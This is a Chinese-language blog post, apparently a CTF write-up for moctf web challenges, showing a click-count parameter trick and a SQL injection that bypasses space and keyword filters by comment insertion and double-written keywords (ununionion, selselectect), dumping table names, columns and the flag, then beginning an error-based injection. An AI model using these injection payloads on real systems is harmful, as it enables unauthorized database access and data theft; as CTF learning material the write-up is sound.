<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="比赛的最后一个小时才知道.看大神的博客学习一下. 大神博客http:&#x2F;&#x2F;skysec.top&#x2F;. 是时候让你手指锻炼一下了 看一下源码 123456789101112131415161718192021222324&lt;script&gt;   var clicks&#x3D;0   $(function() &#123;     $(&quot;#cookie&quot;)       .mousedo">
<meta property="og:type" content="article">
<meta property="og:title" content="moctf学习">
<meta property="og:url" content="http://example.com/2018/02/22/moctf%E5%AD%A6%E4%B9%A0/index.html">
<meta property="og:site_name" content="blacsheep&#39;s blog">
<meta property="og:description" content="比赛的最后一个小时才知道.看大神的博客学习一下. 大神博客http:&#x2F;&#x2F;skysec.top&#x2F;. 是时候让你手指锻炼一下了 看一下源码 123456789101112131415161718192021222324&lt;script&gt;   var clicks&#x3D;0   $(function() &#123;     $(&quot;#cookie&quot;)       .mousedo">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2018-02-22T00:34:26.000Z">
<meta property="article:modified_time" content="2023-07-10T02:12:02.242Z">
<meta property="article:author" content="blacsheep">
<meta name="twitter:card" content="summary">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>moctf学习</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
		<script type="text/x-mathjax-config">
		  MathJax.Hub.Config({
			tex2jax: {
			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
			  inlineMath: [['$','$']]
			}
		  });
		</script>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
	
<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/categories/">Category</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2018/02/22/hgame%E4%B8%89%E5%91%A8web%E9%A2%98%E8%A7%A3/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2018/02/09/mysql%E7%9A%84%E8%A1%A5%E5%85%85%E5%AD%A6%E4%B9%A0/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2018/02/22/moctf%E5%AD%A6%E4%B9%A0/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2018/02/22/moctf%E5%AD%A6%E4%B9%A0/&text=moctf学习"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2018/02/22/moctf%E5%AD%A6%E4%B9%A0/&title=moctf学习"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2018/02/22/moctf%E5%AD%A6%E4%B9%A0/&is_video=false&description=moctf学习"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=moctf学习&body=Check out this article: http://example.com/2018/02/22/moctf%E5%AD%A6%E4%B9%A0/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2018/02/22/moctf%E5%AD%A6%E4%B9%A0/&title=moctf学习"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2018/02/22/moctf%E5%AD%A6%E4%B9%A0/&title=moctf学习"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2018/02/22/moctf%E5%AD%A6%E4%B9%A0/&title=moctf学习"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2018/02/22/moctf%E5%AD%A6%E4%B9%A0/&title=moctf学习"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2018/02/22/moctf%E5%AD%A6%E4%B9%A0/&name=moctf学习&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2018/02/22/moctf%E5%AD%A6%E4%B9%A0/&t=moctf学习"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%98%AF%E6%97%B6%E5%80%99%E8%AE%A9%E4%BD%A0%E6%89%8B%E6%8C%87%E9%94%BB%E7%82%BC%E4%B8%80%E4%B8%8B%E4%BA%86"><span class="toc-number">1.</span> <span class="toc-text">是时候让你手指锻炼一下了</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-injection"><span class="toc-number">2.</span> <span class="toc-text">ez Injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A6%81%E8%AE%A4%E7%9C%9F"><span class="toc-number">3.</span> <span class="toc-text">要认真</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pubg"><span class="toc-number">4.</span> <span class="toc-text">PUBG</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BB%E5%BD%95%E4%B8%80%E5%93%88"><span class="toc-number">5.</span> <span class="toc-text">登录一哈</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ping%E4%B8%80%E4%B8%8B%E5%A5%BD%E5%90%97"><span class="toc-number">6.</span> <span class="toc-text">ping一下好吗</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9B%B4%E6%96%B0"><span class="toc-number">6.1.</span> <span class="toc-text">2.22更新</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86"><span class="toc-number">7.</span> <span class="toc-text">字符串处理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E7%89%88"><span class="toc-number">7.1.</span> <span class="toc-text">测试版:</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        moctf学习
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">blacsheep</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2018-02-22T00:34:26.000Z" class="dt-published" itemprop="datePublished">2018-02-22</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/web%E7%AF%87/">web篇</a>
    </div>


      

    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <p>比赛的最后一个小时才知道.看大神的博客学习一下. 大神博客<a
target="_blank" rel="noopener" href="http://skysec.top/"
title="http://skysec.top/">http://skysec.top/</a>.</p>
<h3 id="是时候让你手指锻炼一下了">是时候让你手指锻炼一下了</h3>
<p>看一下源码</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">   <span class="keyword">var</span> clicks=<span class="number">0</span></span><br><span class="line">   $(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">     $(<span class="string">&quot;#cookie&quot;</span>)</span><br><span class="line">       .<span class="title function_">mousedown</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">         $(<span class="variable language_">this</span>).<span class="title function_">width</span>(<span class="string">&#x27;350px&#x27;</span>).<span class="title function_">height</span>(<span class="string">&#x27;350px&#x27;</span>);</span><br><span class="line">       &#125;)</span><br><span class="line">       .<span class="title function_">mouseup</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">         $(<span class="variable language_">this</span>).<span class="title function_">width</span>(<span class="string">&#x27;375px&#x27;</span>).<span class="title function_">height</span>(<span class="string">&#x27;375px&#x27;</span>);</span><br><span class="line">         clicks++;</span><br><span class="line">         $(<span class="string">&quot;#clickcount&quot;</span>).<span class="title function_">text</span>(clicks);</span><br><span class="line">         <span class="keyword">if</span>(clicks &gt;= <span class="number">108000</span>)&#123;</span><br><span class="line">           <span class="keyword">var</span> form = $(<span class="string">&#x27;&lt;form action=&quot;&quot; method=&quot;get&quot;&gt;&#x27;</span> +</span><br><span class="line">                       <span class="string">&#x27;&lt;input type=&quot;text&quot; name=&quot;clicks&quot; value=&quot;&#x27;</span> + clicks + <span class="string">&#x27;&quot; hidden/&gt;&#x27;</span> +</span><br><span class="line">                       <span class="string">&#x27;&lt;/form&gt;&#x27;</span>);</span><br><span class="line">                       $(<span class="string">&#x27;body&#x27;</span>).<span class="title function_">append</span>(form);</span><br><span class="line">                       form.<span class="title function_">submit</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">         &#125;</span><br><span class="line">       &#125;);</span><br><span class="line">   &#125;);</span><br><span class="line"> &lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>看一下请求,get一个clicks=108000</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://120.78.57.208:6003/web1/?clicks=108000</span><br></pre></td></tr></table></figure>
<p>拿到flag:moctf{Here_Is_Your_Surprise}</p>
<h3 id="ez-injection">ez Injection</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://120.78.57.208:6002/?id=1</span><br></pre></td></tr></table></figure>
<p>返回</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;b&gt;尊敬的:saltyfish您本次恭喜您本次比赛荣获第:1名&lt;/b&gt;&lt;/br&gt;&lt;/center&gt;</span><br></pre></td></tr></table></figure>
<p>随意测试一下发现空格被过滤,注释绕过,sky大神用的%0a绕,差不多</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://120.78.57.208:6002/?id=1%27/**/order/**/by/**/4%23</span><br></pre></td></tr></table></figure>
<p>无返回</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://120.78.57.208:6002/?id=1%27/**/order/**/by/**/3%23</span><br></pre></td></tr></table></figure>
<p>返回</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;b&gt;尊敬的:saltyfish您本次恭喜您本次比赛荣获第:1名&lt;/b&gt;&lt;/br&gt;&lt;/center&gt;</span><br></pre></td></tr></table></figure>
<p>发现提取的三列 然后尝试用union select</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://120.78.57.208:6002/?id=1%27/**/union/**/select/**/1,2,3%23</span><br></pre></td></tr></table></figure>
<p>发现没有返回... 这个时候我就傻逼了...不知道怎么做,看了大神的wp之后...
大神随手一个双写就绕过去了.. 大神的想法是..可能union和select被过滤了
那么访问</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://120.78.57.208:6002/?id=1%27/**/union%23</span><br></pre></td></tr></table></figure>
<p>应该是返回正常的
我自己去尝试了一下,发现确实正常,那么为什么是把union替换为了空呐?
我自己又去尝试了一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://120.78.57.208:6002/?id=1%27/**/1%23</span><br></pre></td></tr></table></figure>
<p>发现返回的是空,那么前面的那个应该是把union替换为了空,所以双写可以绕过的,应该是这个逻辑</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:120.78.57.208:6002/?id=1%27/**/ununionion/**/selselectect/**/1,2,3%23</span><br></pre></td></tr></table></figure>
<p>得到返回</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;b&gt;尊敬的:saltyfish您本次恭喜您本次比赛荣获第:1名&lt;/b&gt;&lt;/br&gt;&lt;b&gt;尊敬的:2您本次恭喜您本次比赛荣获第:1名&lt;/b&gt;&lt;/br&gt;&lt;/center&gt;</span><br></pre></td></tr></table></figure>
<p>然后测试的时候发现括号被过滤了,但是影响不大,直接提取就好了
然后去访问</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:120.78.57.208:6002/?id=1&#x27;/**/ununionion/**/selselectect/**/1,table_name,3/**/from/**/information_schema.tables%23</span><br></pre></td></tr></table></figure>
<p>发现又没有返回了,多的单词只有table_name,from,information,schema,一个一个测试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://120.78.57.208:6002/?id=1%27/**/information%23</span><br></pre></td></tr></table></figure>
<p>后面的information换成table,name,schema都返回空,说明没被过滤,但是from返回正常,那么双写from,提取成功,直接提取出了所有表</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">尊敬的:saltyfish您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:CHARACTER_SETS您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:COLLATIONS您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:COLLATION_CHARACTER_SET_APPLICABILITY您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:COLUMNS您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:COLUMN_PRIVILEGES您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:ENGINES您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:EVENTS您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:FILES您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:GLOBAL_STATUS您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:GLOBAL_VARIABLES您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:KEY_COLUMN_USAGE您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:PARAMETERS您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:PARTITIONS您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:PLUGINS您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:PROCESSLIST您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:PROFILING您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:REFERENTIAL_CONSTRAINTS您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:ROUTINES您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:SCHEMATA您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:SCHEMA_PRIVILEGES您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:SESSION_STATUS您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:SESSION_VARIABLES您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:STATISTICS您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:TABLES您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:TABLESPACES您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:TABLE_CONSTRAINTS您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:TABLE_PRIVILEGES您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:TRIGGERS您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:USER_PRIVILEGES您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:VIEWS您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:INNODB_BUFFER_PAGE您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:INNODB_TRX您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:INNODB_BUFFER_POOL_STATS您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:INNODB_LOCK_WAITS您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:INNODB_CMPMEM您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:INNODB_CMP您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:INNODB_LOCKS您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:INNODB_CMPMEM_RESET您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:INNODB_CMP_RESET您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:INNODB_BUFFER_PAGE_LRU您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:columns_priv您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:db您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:event您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:func您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:general_log您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:help_category您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:help_keyword您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:help_relation您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:help_topic您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:host您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:ndb_binlog_index您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:plugin您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:proc您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:procs_priv您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:proxies_priv您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:servers您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:slow_log您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:tables_priv您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:time_zone您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:time_zone_leap_second您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:time_zone_name您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:time_zone_transition您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:time_zone_transition_type您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:user您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:cond_instances您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:events_waits_current您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:events_waits_history您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:events_waits_history_long您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:events_waits_summary_by_instance您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:events_waits_summary_by_thread_by_event_name您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:events_waits_summary_global_by_event_name您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:file_instances您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:file_summary_by_event_name您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:file_summary_by_instance您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:mutex_instances您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:performance_timers您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:rwlock_instances您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:setup_consumers您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:setup_instruments您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:setup_timers您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:threads您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:04ad5938eaf0efb6您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:qqflycar您本次恭喜您本次比赛荣获第:1名</span><br></pre></td></tr></table></figure>
<p>发现倒数第二个比较奇怪,那么继续提取
提取的时候发现where被过滤,双写绕</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://120.78.57.208:6002/?id=1%27/**/ununionion/**/selselectect/**/1,column_name,3/**/frfromom/**/information_schema.columns/**/whwhereere/**/table_name=%2204ad5938eaf0efb6%22%23</span><br></pre></td></tr></table></figure>
<p>这里双引号没被过滤,直接用名字上了,过滤了的话可以0x+十六进制绕过
返回</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">尊敬的:saltyfish您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:name您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:value您本次恭喜您本次比赛荣获第:1名</span><br></pre></td></tr></table></figure>
<p>继续提value</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://120.78.57.208:6002/?id=1%27/**/ununionion/**/selselectect/**/1,value,3/**/frfromom/**/04ad5938eaf0efb6%23</span><br></pre></td></tr></table></figure>
<p>返回</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">尊敬的:saltyfish您本次恭喜您本次比赛荣获第:1名</span><br><span class="line">尊敬的:moctf&#123;5o_easy_inj3cTi0n&#125;您本次恭喜您本次比赛荣获第:1名</span><br></pre></td></tr></table></figure>
<p>flag:moctf{5o_easy_inj3cTi0n}</p>
<h3 id="要认真">要认真</h3>
<p>发现一个后台登录界面,继续找一找,发现一个url</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://119.29.170.143:6003/list.php?id=23</span><br></pre></td></tr></table></figure>
<p>然后测试一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://119.29.170.143:6003/list.php?id=23^0</span><br><span class="line">http://119.29.170.143:6003/list.php?id=23^1</span><br></pre></td></tr></table></figure>
<p>发现返回不一样
大神是盲注,但是我盲注的时候出了点问题,这个地方卡了好久...
这个地方过滤掉了等于号和where,但是可以报错注入,所以我是报错注入做的,注意闭合它的括号
其次注意报错注入每次只能提取32个字符,所以一次一次提取,最后一次的结果已经无所谓了,因为有用的已经提出来了</p>
